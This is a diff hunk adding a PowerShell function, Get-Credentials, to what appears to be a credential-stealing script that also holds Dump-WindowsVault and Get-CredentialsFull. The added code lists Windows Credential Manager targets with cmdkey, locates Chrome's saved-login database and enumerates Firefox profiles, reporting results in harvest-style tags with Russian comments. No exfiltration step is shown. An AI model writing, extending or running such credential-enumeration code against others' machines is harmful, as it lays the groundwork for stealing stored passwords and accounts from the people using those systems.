@@ -470,7 +470,38 @@ function Dump-WindowsVault {
 
 
 
+function Get-Credentials {
+    try {
+        $output = ""
 
+        # 1. Windows Credential Manager (список целей)
+        $creds = cmdkey /list | Select-String "Target:" | ForEach-Object {
+            $target = $_.ToString().Split(":")[1].Trim()
+            $output += "`n[TARGET] $target"
+        }
+
+        # 2. Chrome логины (только путь)
+        $chromeLoginPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+        if (Test-Path $chromeLoginPath) {
+            $output += "`n[+] Chrome login database found: $chromeLoginPath"
+        }
+
+        # 3. Firefox профили
+        $firefoxProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($profile in $firefoxProfiles) {
+            $output += "`n[+] Firefox profile: $($profile.FullName)"
+        }
+
+        if ([string]::IsNullOrWhiteSpace($output)) {
+            return "[INFO] No credentials found or access denied."
+        }
+
+        return $output
+    }
+    catch {
+        return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
+    }
+}
     function Get-CredentialsFull {
     $output = "`n[*] Windows Credential Manager:`n"
     $output += (Get-Credentials)
